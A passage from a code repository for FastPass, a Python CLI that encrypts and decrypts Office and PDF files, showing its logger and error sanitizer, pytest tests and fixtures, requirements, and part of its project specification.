    logger.setLevel(logging.DEBUG if debug else logging.INFO)
    
    # A3b: Set Up TTY-Aware Progress Tracking
    # TTY: Full timestamp format for console display
    # Non-TTY: Simple format for file redirection
    is_tty = sys.stdout.isatty()
    
    if is_tty:
        # A3c: Initialize Multi-Handler Logger - TTY format
        console_format = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
        date_format = "%Y-%m-%d %H:%M:%S"
    else:
        # Non-TTY: Simple format for file redirection
        console_format = "[%(levelname)s] %(message)s"
        date_format = None
    
    # Create console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_formatter = logging.Formatter(console_format, datefmt=date_format)
    console_handler.setFormatter(console_formatter)
    logger.addHandler(console_handler)
    
    # A3c: Add file handler if --log-file specified
    if log_file:
        try:
            # Ensure log directory exists
            log_file.parent.mkdir(parents=True, exist_ok=True)
            
            file_handler = logging.FileHandler(log_file)
            file_format = "%(asctime)s [%(levelname)s] %(name)s:%(lineno)d: %(message)s"
            file_formatter = logging.Formatter(file_format, datefmt="%Y-%m-%d %H:%M:%S")
            file_handler.setFormatter(file_formatter)
            logger.addHandler(file_handler)
        except Exception as e:
            logger.warning(f"Could not create log file {log_file}: {e}")
    
    # A3e: Record Program Startup with Config
    logger.debug(f"FastPass logger initialized (TTY: {is_tty})")
    
    return logger


def sanitize_error_message(message: str) -> str:
    """
    E3a: Sanitize Error Messages
    Apply sanitize_error_message() to all errors
    Remove paths, passwords, sensitive patterns
    """
    import re
    
    # E3a_Sanitize: Pattern-Based Sanitization
    # Remove password=<value>, IP addresses, email addresses
    sanitized = message
    
    # Remove password patterns
    sanitized = re.sub(r'password[=:\s]+[^\s,]+', 'password=<REDACTED>', sanitized, flags=re.IGNORECASE)
    
    # Remove file paths (keep just filename)
    sanitized = re.sub(r'[A-Za-z]:[\\\/][^\\\/\s]*[\\\/]([^\\\/\s]+)', r'<path>/\1', sanitized)
    sanitized = re.sub(r'\/[^\/\s]*\/([^\/\s]+)', r'<path>/\1', sanitized)
    
    # Remove potential IP addresses
    sanitized = re.sub(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', '<IP_ADDRESS>', sanitized)
    
    # Remove email addresses
    sanitized = re.sub(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', '<EMAIL>', sanitized)
    
    return sanitized
</file>

<file path="test_sample.txt">
This is a test file for FastPass functionality testing.
</file>

<file path="tests/conftest.py">
"""
FastPass Test Configuration and Fixtures
PyTest configuration and shared fixtures
"""

import pytest
import tempfile
import shutil
from pathlib import Path
import subprocess
import os

@pytest.fixture(scope="session")
def test_data_dir():
    """Fixture providing test data directory"""
    return Path(__file__).parent / "fixtures"

@pytest.fixture(scope="session") 
def sample_files_dir(test_data_dir):
    """Fixture providing sample files directory"""
    return test_data_dir / "sample_files"

@pytest.fixture
def temp_work_dir():
    """Fixture providing temporary working directory for each test"""
    temp_dir = tempfile.mkdtemp(prefix="fastpass_test_")
    yield Path(temp_dir)
    shutil.rmtree(temp_dir, ignore_errors=True)

@pytest.fixture
def fastpass_executable():
    """Fixture providing path to FastPass executable"""
    # Return the module path for running FastPass
    return ["uv", "run", "python", "-m", "src"]

@pytest.fixture
def simple_test_pdf(temp_work_dir):
    """Create a simple test PDF"""
    pdf_content = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj

4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Test PDF Content) Tj
ET
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000216 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
310
%%EOF"""
    
    test_pdf = temp_work_dir / "test.pdf"
    with open(test_pdf, 'w') as f:
        f.write(pdf_content)
    
    return test_pdf

@pytest.fixture
def password_list_file(temp_work_dir):
    """Fixture providing password list file"""
    password_file = temp_work_dir / "passwords.txt"
    passwords = [
        "password123",
        "secret456", 
        "complex&password!",
        "test with spaces"
    ]
    
    with open(password_file, 'w', encoding='utf-8') as f:
        for password in passwords:
            f.write(f"{password}\n")
    
    return password_file
</file>

<file path="tests/requirements.txt">
# Test dependencies
pytest>=7.0.0
pytest-cov>=4.0.0
</file>

<file path="tests/test_cli_basic.py">
"""
Basic CLI Tests for FastPass
Test core CLI functionality and argument parsing
Maps to: test_cli_parsing.py from test design
"""

import subprocess
import pytest
from pathlib import Path
import os

class TestCLIBasicFunctionality:
    """Test basic CLI operations and help functions"""
    
    def test_help_display(self, fastpass_executable):
        """Test: -h and --help show usage information"""
        # A1h_Help: Show Help Information
        result = subprocess.run(
            fastpass_executable + ["--help"], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 0
        assert "FastPass" in result.stdout
        assert "encrypt" in result.stdout
        assert "decrypt" in result.stdout
        assert "check-password" in result.stdout
    
    def test_version_display(self, fastpass_executable):
        """Test: --version shows version information"""
        result = subprocess.run(
            fastpass_executable + ["--version"], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 0
        assert "FastPass" in result.stdout
        assert "1.0.0" in result.stdout
    
    def test_list_supported_formats(self, fastpass_executable):
        """Test: --list-supported shows format list and exits"""
        # A1i_List: Show Supported File Types
        result = subprocess.run(
            fastpass_executable + ["--list-supported"], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 0
        assert "FastPass Supported File Formats" in result.stdout
        assert ".pdf" in result.stdout
        assert ".docx" in result.stdout
        assert "Modern Office Documents" in result.stdout
        assert "PDF Documents" in result.stdout
        assert "Legacy Office Formats" in result.stdout
    
    def test_no_operation_error(self, fastpass_executable):
        """Test: Missing operation should trigger error"""
        result = subprocess.run(
            fastpass_executable + ["-i", "test.pdf", "-p", "password"], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 2
        assert "Must specify an operation" in result.stderr
    
    def test_no_input_files_error(self, fastpass_executable):
        """Test: Missing -i flag should trigger error"""
        # A2a_Error: Nothing to Process
        result = subprocess.run(
            fastpass_executable + ["encrypt", "-p", "password"], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 2
        assert "Must specify either files" in result.stderr
    
    def test_no_password_error(self, fastpass_executable):
        """Test: Missing -p should trigger error for encrypt/decrypt"""
        result = subprocess.run(
            fastpass_executable + ["encrypt", "-i", "test.pdf"], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 2
        assert "Must specify passwords" in result.stderr

class TestCLIArgumentValidation:
    """Test CLI argument validation logic"""
    
    def test_conflicting_input_methods(self, fastpass_executable, temp_work_dir):
        """Test: Conflicting input methods should error"""
        # A2a_Both_Error: Conflicting Instructions
        result = subprocess.run(
            fastpass_executable + [
                "decrypt", 
                "-i", "test.pdf", 
                "-r", str(temp_work_dir),
                "-p", "password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 2
        assert "Cannot specify both individual files and recursive directory" in result.stderr
    
    def test_recursive_encrypt_blocked(self, fastpass_executable, temp_work_dir):
        """Test: Recursive mode with encrypt should be blocked"""
        # A2a1_Error: Recursive Encryption Blocked
        result = subprocess.run(
            fastpass_executable + [
                "encrypt", 
                "-r", str(temp_work_dir),
                "-p", "password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 2
        assert "Recursive mode only supported for decrypt operations" in result.stderr
    
    def test_recursive_decrypt_allowed(self, fastpass_executable, temp_work_dir):
        """Test: Recursive mode with decrypt should be allowed"""
        result = subprocess.run(
            fastpass_executable + [
                "decrypt", 
                "-r", str(temp_work_dir),
                "-p", "password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        # Should not error on argument validation
        # May error later on file processing, but that's expected
        assert "Recursive mode only supported for decrypt operations" not in result.stderr

class TestCLIPasswordHandling:
    """Test password argument handling"""
    
    def test_single_password_cli(self, fastpass_executable, simple_test_pdf):
        """Test: -p password123"""
        result = subprocess.run(
            fastpass_executable + [
                "check-password",
                "-i", str(simple_test_pdf),
                "-p", "testpassword"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        # Should accept the password argument without validation errors
        assert "Must specify passwords" not in result.stderr
    
    def test_multiple_passwords_cli(self, fastpass_executable, simple_test_pdf):
        """Test: -p password1 password2 "complex pass" """
        result = subprocess.run(
            fastpass_executable + [
                "check-password",
                "-i", str(simple_test_pdf),
                "-p", "password1", "password2", "complex pass"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        # Should accept multiple passwords without validation errors
        assert "Must specify passwords" not in result.stderr
    
    def test_password_list_file(self, fastpass_executable, simple_test_pdf, password_list_file):
        """Test: --password-list passwords.txt"""
        result = subprocess.run(
            fastpass_executable + [
                "check-password",
                "-i", str(simple_test_pdf),
                "--password-list", str(password_list_file)
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        # Should accept password list file without validation errors
        assert "Must specify passwords" not in result.stderr

class TestFileFormatValidation:
    """Test file format validation"""
    
    def test_unsupported_file_format(self, fastpass_executable, temp_work_dir):
        """Test: Unsupported formats (.txt, .zip) should be rejected"""
        # Create a test txt file
        test_txt = temp_work_dir / "test.txt"
        test_txt.write_text("Test content")
        
        result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", str(test_txt),
                "-p", "password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 1
        assert "Unsupported file format" in result.stderr
        assert ".txt" in result.stderr
    
    def test_nonexistent_file(self, fastpass_executable):
        """Test: Non-existent files should be handled gracefully"""
        result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", "nonexistent_file.pdf",
                "-p", "password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 1
        # Should report file not found error
</file>

<file path="tests/test_integration_basic.py">
"""
Basic Integration Tests for FastPass
Test end-to-end functionality with real files
Maps to: test_encrypt_operations.py and test_decrypt_operations.py from test design
"""

import subprocess
import pytest
from pathlib import Path
import shutil

class TestPDFOperations:
    """Test real PDF encryption and decryption operations"""
    
    def test_pdf_encrypt_decrypt_cycle(self, fastpass_executable, temp_work_dir):
        """Test: Complete encrypt→decrypt cycle preserves content"""
        
        # Use existing test PDF
        source_pdf = Path(__file__).parent.parent / "dev" / "pdf" / "test1_docx.pdf"
        if not source_pdf.exists():
            pytest.skip("Test PDF not available")
        
        # Copy to temp directory for testing
        test_pdf = temp_work_dir / "test_cycle.pdf"
        shutil.copy2(source_pdf, test_pdf)
        
        # Get original file size for comparison
        original_size = test_pdf.stat().st_size
        
        # Step 1: Encrypt the PDF
        encrypt_result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", str(test_pdf),
                "-p", "test_password_123"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert encrypt_result.returncode == 0, f"Encryption failed: {encrypt_result.stderr}"
        assert "Successfully encrypted" in encrypt_result.stdout
        
        # Verify file still exists and size changed
        assert test_pdf.exists()
        encrypted_size = test_pdf.stat().st_size
        # Encrypted file should be different size (usually larger)
        
        # Step 2: Verify file is now encrypted (check-password should succeed)
        check_result = subprocess.run(
            fastpass_executable + [
                "check-password",
                "-i", str(test_pdf),
                "-p", "test_password_123"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert check_result.returncode == 0, f"Password check failed: {check_result.stderr}"
        
        # Step 3: Decrypt the PDF
        decrypt_result = subprocess.run(
            fastpass_executable + [
                "decrypt",
                "-i", str(test_pdf),
                "-p", "test_password_123"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert decrypt_result.returncode == 0, f"Decryption failed: {decrypt_result.stderr}"
        assert "Successfully decrypted" in decrypt_result.stdout
        
        # Verify file still exists and is accessible
        assert test_pdf.exists()
        final_size = test_pdf.stat().st_size
        
        # File should be accessible without password now
        check_no_password = subprocess.run(
            fastpass_executable + [
                "check-password",
                "-i", str(test_pdf)
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        # Should complete successfully (no password needed for unencrypted file)
        assert check_no_password.returncode == 0
    
    def test_pdf_wrong_password_fails(self, fastpass_executable, temp_work_dir):
        """Test: Wrong password should fail gracefully"""
        
        # Use existing test PDF
        source_pdf = Path(__file__).parent.parent / "dev" / "pdf" / "test1_docx.pdf"
        if not source_pdf.exists():
            pytest.skip("Test PDF not available")
        
        # Copy to temp directory
        test_pdf = temp_work_dir / "test_wrong_password.pdf"
        shutil.copy2(source_pdf, test_pdf)
        
        # Encrypt with one password
        encrypt_result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", str(test_pdf),
                "-p", "correct_password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert encrypt_result.returncode == 0
        
        # Try to decrypt with wrong password
        decrypt_result = subprocess.run(
            fastpass_executable + [
                "decrypt",
                "-i", str(test_pdf),
                "-p", "wrong_password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        # Should fail with password error
        assert decrypt_result.returncode != 0
        # Should contain password-related error message
    
    def test_multiple_files_same_password(self, fastpass_executable, temp_work_dir):
        """Test: Multiple files with same password"""
        
        source_pdf = Path(__file__).parent.parent / "dev" / "pdf" / "test1_docx.pdf"
        if not source_pdf.exists():
            pytest.skip("Test PDF not available")
        
        # Create multiple test files
        test_files = []
        for i in range(3):
            test_file = temp_work_dir / f"test_multi_{i}.pdf"
            shutil.copy2(source_pdf, test_file)
            test_files.append(test_file)
        
        # Encrypt all files with same password
        encrypt_result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i"] + [str(f) for f in test_files] + [
                "-p", "shared_password_123"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert encrypt_result.returncode == 0
        assert "Total files processed: 3" in encrypt_result.stdout
        assert "Successful: 3" in encrypt_result.stdout
        assert "Failed: 0" in encrypt_result.stdout
        
        # Decrypt all files with same password
        decrypt_result = subprocess.run(
            fastpass_executable + [
                "decrypt",
                "-i"] + [str(f) for f in test_files] + [
                "-p", "shared_password_123"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert decrypt_result.returncode == 0
        assert "Total files processed: 3" in decrypt_result.stdout
        assert "Successful: 3" in decrypt_result.stdout

class TestPasswordListFunctionality:
    """Test password list file functionality"""
    
    def test_password_list_file_usage(self, fastpass_executable, temp_work_dir, password_list_file):
        """Test: Password list file works correctly"""
        
        source_pdf = Path(__file__).parent.parent / "dev" / "pdf" / "test1_docx.pdf"
        if not source_pdf.exists():
            pytest.skip("Test PDF not available")
        
        test_pdf = temp_work_dir / "test_password_list.pdf"
        shutil.copy2(source_pdf, test_pdf)
        
        # Encrypt with first password from our list
        encrypt_result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", str(test_pdf),
                "-p", "password123"  # This should be first in password_list_file
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert encrypt_result.returncode == 0
        
        # Try to decrypt using password list (should find the correct password)
        decrypt_result = subprocess.run(
            fastpass_executable + [
                "decrypt",
                "-i", str(test_pdf),
                "--password-list", str(password_list_file)
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert decrypt_result.returncode == 0
        assert "Successfully decrypted" in decrypt_result.stdout

class TestOutputDirectory:
    """Test output directory functionality"""
    
    def test_output_directory_creation(self, fastpass_executable, temp_work_dir):
        """Test: Output directory is created and files are placed correctly"""
        
        source_pdf = Path(__file__).parent.parent / "dev" / "pdf" / "test1_docx.pdf"
        if not source_pdf.exists():
            pytest.skip("Test PDF not available")
        
        test_pdf = temp_work_dir / "input" / "test_output.pdf"
        test_pdf.parent.mkdir(exist_ok=True)
        shutil.copy2(source_pdf, test_pdf)
        
        output_dir = temp_work_dir / "output"
        
        # Encrypt with output directory
        encrypt_result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", str(test_pdf),
                "-p", "output_test_password",
                "-o", str(output_dir)
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert encrypt_result.returncode == 0
        
        # Verify output directory was created
        assert output_dir.exists()
        assert output_dir.is_dir()
        
        # Verify file was created in output directory
        output_file = output_dir / test_pdf.name
        assert output_file.exists()
        
        # Original file should still exist
        assert test_pdf.exists()
</file>

<file path="requirements.txt">
# A1a: Load System Tools - Required dependencies
msoffcrypto-tool>=5.0.0    # Office document encryption/decryption
PyPDF2>=3.0.0              # PDF processing and encryption
filetype>=1.2.0            # File type detection (replaces python-magic)
</file>

<file path="dev/fast_pass_specification.md">
# FastPass - Complete Project Specification

> **Document Purpose & Maintenance Protocol:**
> This document serves as the authoritative, self-documenting specification for FastPass.
> It provides complete context to future AI instances and developers about:
>
> - **Current project status** and implementation details
> - **Architecture decisions** and technical solutions  
> - **Lessons learned** from development challenges
> - **Usage patterns** and deployment instructions
> - **Complete change history** and evolution of the project
>
> **Maintenance Requirement:** This document MUST be updated whenever significant changes are made to the codebase, architecture, or functionality. It should always reflect the current state of the project and serve as the single source of truth for understanding the entire system.

## Project Mission & Purpose

**FastPass** is a command-line tool that provides universal file encryption and decryption capabilities across multiple file formats. It serves as a unified front-end wrapper for specialized crypto tools (msoffcrypto-tool, PyPDF2) to add or remove password protection from Microsoft Office documents and PDF files.

**Core Problem Solved:** Eliminates the need to learn and manage multiple separate tools for file encryption/decryption across different formats. Provides a consistent, secure interface for password protection operations while maintaining file integrity and implementing enterprise-grade security practices.

**Key Differentiator:** Unified CLI interface with enterprise security patterns including file isolation, in-memory validation, password list support, and secure password handling. Follows proven architecture patterns with "it just works" simplicity for reliability and security.

---

## Product Requirements Document (PRD)

### Project Overview

- **Project Name:** FastPass
- **Version:** v1.0
- **Target Platform:** Windows Desktop (CLI) with cross-platform Python support
- **Technology Stack:** Python, msoffcrypto-tool, PyPDF2, filetype library, pathlib
- **Timeline:** Development in progress
- **Team Size:** Single developer maintained

### Target Users

- **Primary Users:** IT administrators, security professionals, business users
- **Secondary Users:** Developers, system integrators, automation script writers
- **User Experience Level:** Intermediate (comfortable with command-line tools)
- **Use Cases:** Batch file encryption, automated security workflows, document protection

### Feature Specifications

#### Core Functionality
- [x] Universal file encryption/decryption interface
- [x] Microsoft Office document password protection (modern and legacy formats)
- [x] PDF password protection and removal  
- [x] Batch processing for multiple files
- [x] Recursive directory processing with in-place or copy modes
- [x] Automatic file format detection using filetype library
- [x] Direct import strategy for simplified code management

#### Security & File Safety
- [x] File format validation using filetype library (simplified magic number checking)
- [x] Path traversal attack prevention with whitelist approach
- [x] Secure temporary file creation with proper permissions (0o600)
- [x] Password memory clearing and secure handling
- [x] Error message sanitization to prevent information disclosure
- [x] Legacy Office format protection (decrypt-only limitation documented)

#### Password Management
- [x] Per-file password specification with automatic pairing
- [x] Password management with multiple password support
- [x] Password list file support for batch operations
- [x] JSON password input via stdin for GUI integration
- [x] Secure password handling and memory cleanup
- [x] Password validation before file processing

#### File Operations
- [x] In-place modification with validation-based safety
- [x] Output directory specification for batch operations
- [x] File integrity verification after operations
- [x] Duplicate filename handling and conflict resolution
- [x] Comprehensive cleanup of temporary files

#### Utility Features
- [x] Dry-run mode for testing operations
- [x] File format support detection
- [x] Password requirement checking
- [x] Batch operation progress reporting
- [x] Detailed logging with debug mode

### Success Metrics

- **Performance Targets:** File processing < 10 seconds for typical business documents
- **User Experience:** Zero data loss through validation, "it just works" simplicity, clear error messages
- **Reliability:** 99.9% successful completion rate for valid inputs
- **Security:** No password exposure in logs, secure temporary file handling

### Constraints & Assumptions

- **Technical Constraints:** Requires underlying crypto libraries (msoffcrypto-tool, PyPDF2) to be available
- **Platform Constraints:** Cross-platform compatible with pure Python dependencies
- **Security Constraints:** Must maintain file confidentiality and integrity throughout operations
- **User Constraints:** Must have appropriate file permissions for input and output directories
- **Assumptions:** Users understand file encryption concepts and password management practices

---

## Project Directory Structure

```
fast_pass/
├── src/                          # Main source code
│   ├── __init__.py
│   ├── __main__.py               # Makes package executable with 'python -m src'
│   ├── cli.py                    # CLI argument parsing and validation
│   ├── core/                     # Core business logic
│   │   ├── __init__.py
│   │   ├── file_handler.py       # File processing pipeline
│   │   ├── security.py           # Security validation and path checking
│   │   ├── crypto_handlers/      # Crypto tool integrations
│   │   │   ├── __init__.py
│   │   │   ├── office_handler.py # msoffcrypto-tool integration
│   │   │   └── pdf_handler.py    # PyPDF2 integration
│   │   └── password/             # Password handling modules
│   │       ├── __init__.py
│   │       ├── password_manager.py # Password validation and management
│   │       └── password_list.py    # Password list file handling
│   └── utils/                    # Utility modules
│       ├── __init__.py
│       ├── logger.py             # Logging configuration
│       └── config.py             # Configuration management
├── tests/                        # Test suite
│   ├── __init__.py
│   ├── test_cli.py
│   ├── test_core.py
│   ├── test_crypto_handlers.py
│   ├── test_security.py
│   ├── test_password_handling.py
│   └── test_integration.py
├── dev/                          # Development documentation
│   └── fast_pass_specification.md
├── requirements.txt              # Python dependencies
├── requirements-dev.txt          # Development dependencies
├── setup.py                      # Package setup
└── README.md                     # User documentation
```

### **Python Dependencies**

**Requirements (requirements.txt):**
```
msoffcrypto-tool>=5.0.0    # Office document encryption/decryption
PyPDF2>=3.0.0              # PDF processing and encryption
filetype>=1.2.0            # File type detection (replaces python-magic)
```

**PyInstaller Integration Notes:**
- All Python packages will be bundled into executable
- No external binaries required - pure Python dependencies
- Direct imports for simplified code management

### **Password Handling Architecture**

**Simplified password management without reuse concept:**

```python
# Password handling with multiple sources and priority algorithm
class PasswordManager:
    def __init__(self):
        self.cli_passwords = []  # Space-delimited passwords from CLI
        self.password_list_file = None  # Path to password list file
        self.password_list = []  # Passwords loaded from file
        
    def load_password_sources(self, args):
        """Load passwords from all sources"""
        # Space-delimited passwords from CLI
        if hasattr(args, 'cli_passwords') and args.cli_passwords:
            self.cli_passwords = [p for p in args.cli_passwords if p != 'stdin']
            
        # Password list file
        if args.password_list:
            self.password_list_file = args.password_list
            self.password_list = self._load_password_list()
            
    def get_password_candidates(self, file_path):
        """Get prioritized list of passwords to try for a file"""
        candidates = []
        
        # Priority 1: CLI -p passwords (in order provided)
        candidates.extend(self.cli_passwords)
        
        # Priority 2: Password list file (line by line)
        candidates.extend(self.password_list)
            
        # Remove duplicates while preserving order
        return list(dict.fromkeys(candidates))
        
    def _load_password_list(self):
        """Load passwords from text file, one per line"""
        try:
            with open(self.password_list_file, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.log_error(f"Password list file not found: {self.password_list_file}")
            return []
            
    def find_working_password(self, file_path, crypto_handler):
        """Find working password for file by trying all candidates"""
        candidates = self.get_password_candidates(file_path)
        
        for password in candidates:
            if crypto_handler.test_password(file_path, password):
                return password
        
        return None
```

---

## Command Line Reference

```
Usage: fast_pass {encrypt|decrypt} [options]

Required Arguments:
  encrypt                  Add password protection to files
  decrypt                  Remove password protection from files

File Input Options:
  -i, --input FILE...      Files to process (space-delimited, quotes for spaces)
  -r, --recursive DIR      Process directory recursively (decrypt/check-password only)

Password Options:
  -p, --password PASS...   Passwords to try (space-delimited, quotes for spaces)
  --password-list FILE     Text file with passwords to try (one per line)
  -p stdin                 Read passwords from JSON via stdin (GUI integration)
  --check-password [FILE]  Check if file requires password (dry-run mode)

Output Options:
  -o, --output-dir DIR     Output directory (default: in-place modification)

Utility Options:
  --dry-run               Show what would be done without making changes
  --verify                Deep verification of processed files
  --list-supported        List supported file formats
  --debug                 Enable detailed logging and debug output
  -h, --help              Show this help message
  -v, --version           Show version information

Supported File Formats:
  Modern Office:     .docx, .xlsx, .pptx, .docm, .xlsm, .pptm, .dotx, .xltx, .potx
                     (Encryption: experimental support, Decryption: full support)
  Legacy Office:     .doc, .xls, .ppt (NOT SUPPORTED - use Office to convert to modern format)
  PDF Files:         .pdf (Full encryption and decryption support)
Examples:
  # Encrypt single file with password
  fast_pass encrypt -i contract.docx -p "mypassword"
  
  # Decrypt multiple files with same password
  fast_pass decrypt -i file1.pdf file2.docx file3.xlsx -p "shared_pwd"
  
  # Multiple passwords via CLI (space-delimited, tries all passwords on all files)
  fast_pass decrypt -i file1.pdf file2.docx -p "password123" "secret456" "admin789"
  
  # Passwords with spaces (quoted)
  fast_pass decrypt -i protected.pdf -p "password1" "password 2" "ps3"
  
  # Password list file for batch operations
  fast_pass decrypt -i "archive_folder/report1.pdf" "archive_folder/report2.pdf" --password-list common_passwords.txt
  
  # Combined approach: specific password + password list fallback
  fast_pass decrypt -i urgent.pdf "archive1.pdf" "archive2.pdf" -p "urgent_pwd" --password-list common_passwords.txt
  
  # Passwords from stdin JSON (GUI integration)
  fast_pass decrypt -i file1.pdf file2.docx -p stdin < passwords.json
  # JSON format: {"file1.pdf": "secret1", "file2.docx": "secret2"}
  
  # Recursively process directory (decrypt only)
  fast_pass decrypt -r ./encrypted_docs/ -p "main_password"
  
  # Recursive with password list
  fast_pass decrypt -r ./archive/ --password-list passwords.txt
  
  # Check password protection status (dry-run)
  fast_pass --check-password -r ./documents/ --password-list test_passwords.txt
  
  # Mixed file types with output directory
  fast_pass encrypt -i report.pdf data.xlsx presentation.pptx -p "secret" -o ./secured/
  
  # Security: Allow current directory access (use with caution)
  fast_pass decrypt -i ./docs/report.pdf --allow-cwd -p "password123"

Exit Codes:
  0  Success
  1  General error (file access, crypto tool failure)
  2  Invalid arguments or command syntax
  3  Security violation (path traversal, invalid format)
  4  Password error (wrong password, authentication failure)
```

---

## High-Level Architecture Overview - Core Processing Flow

> 💡 **IMPLEMENTATION CRITICAL**: This pseudocode provides the master reference for code organization. Every code block must map to a specific element ID (e.g., `# A1a`, `# B3c`, etc.)

```python
# MAIN PROGRAM ENTRY POINT
def main():
    """FastPass main entry point with complete error handling"""
    try:
        # A: CLI Parsing & Initialization
        args = parse_command_line_arguments()
        if args.help or args.version or args.list_supported:
            display_information_and_exit(args)  # Exit code 0
        
        # B: Security & File Validation  
        validated_files = perform_security_and_file_validation(args)
        
        # C: Crypto Tool Selection & Configuration
        crypto_handlers = setup_crypto_tools_and_configuration(validated_files)
        
        # D: File Processing & Operations
        processing_results = process_files_with_crypto_operations(
            validated_files, crypto_handlers, args
        )
        
        # E: Cleanup & Results Reporting
        exit_code = cleanup_and_generate_final_report(processing_results)
        sys.exit(exit_code)
        
    except SecurityViolationError as e:
        log_sanitized_error(e)
        sys.exit(3)  # Security violation
    except FileFormatError as e:
        log_error(f"File format error: {e}")
        sys.exit(1)  # Format/access error
    except CryptoToolError as e:
        log_error(f"Crypto tool unavailable: {e}")
        sys.exit(1)  # Tool availability error
    except ProcessingError as e:
        cleanup_partial_processing_on_failure()
        sys.exit(1)  # Processing failure
    except Exception as e:
        log_error(f"Unexpected error: {e}")
        sys.exit(2)  # General error

# CONFIGURATION MANAGEMENT SYSTEM
class FastPassConfig:
    """Configuration management with multiple sources and precedence"""
    VERSION = "1.0.0"
    MAX_FILE_SIZE = 500 * 1024 * 1024  # 500MB
    TEMP_DIR_PREFIX = "fastpass_"
    SECURE_FILE_PERMISSIONS = 0o600
    SUPPORTED_FORMATS = {
        '.docx': 'msoffcrypto',
        '.xlsx': 'msoffcrypto', 
        '.pptx': 'msoffcrypto',
        '.docm': 'msoffcrypto',
        '.xlsm': 'msoffcrypto',
        '.pptm': 'msoffcrypto',
        '.dotx': 'msoffcrypto',
        '.xltx': 'msoffcrypto',
        '.potx': 'msoffcrypto',
        '.pdf': 'PyPDF2'
    }
    
    # Configuration file locations (in order of precedence)
    CONFIG_LOCATIONS = [
        Path.home() / '.fastpass' / 'config.json',  # User config
        Path.cwd() / 'fastpass.json',               # Project config
        Path(__file__).parent / 'config.json'      # Default config
    ]
    
    @classmethod
    def load_configuration(cls, cli_args: argparse.Namespace) -> Dict[str, Any]:
        """Load configuration from multiple sources with precedence"""
        config = cls._get_default_config()
        
        # 1. Load from config files (lowest precedence)
        for config_path in cls.CONFIG_LOCATIONS:
            if config_path.exists():
                try:
                    with open(config_path, 'r') as f:
                        file_config = json.load(f)
                        config.update(file_config)
                except (json.JSONDecodeError, IOError) as e:
                    print(f"Warning: Could not load config from {config_path}: {e}")
        
        # 2. Load from environment variables
        env_config = cls._load_from_environment()
        config.update(env_config)
        
        # 3. Override with CLI arguments (highest precedence)
        cli_config = cls._extract_cli_config(cli_args)
        config.update(cli_config)
        
        return config
    
    @classmethod
    def _get_default_config(cls) -> Dict[str, Any]:
        """Default configuration values"""
        return {
            'max_file_size': cls.MAX_FILE_SIZE,
            'temp_dir_prefix': cls.TEMP_DIR_PREFIX,
            'secure_permissions': cls.SECURE_FILE_PERMISSIONS,
            'supported_formats': cls.SUPPORTED_FORMATS.copy(),
            'log_level': 'INFO',
            'log_file': None,
            'cleanup_on_error': True,
            # Security hardening settings
            'allow_cwd': False,  # Default: do not allow current directory access
            'max_password_length': 1024,
            'max_json_size': 1024 * 1024,  # 1MB limit for password JSON
            'max_path_length': 4096,
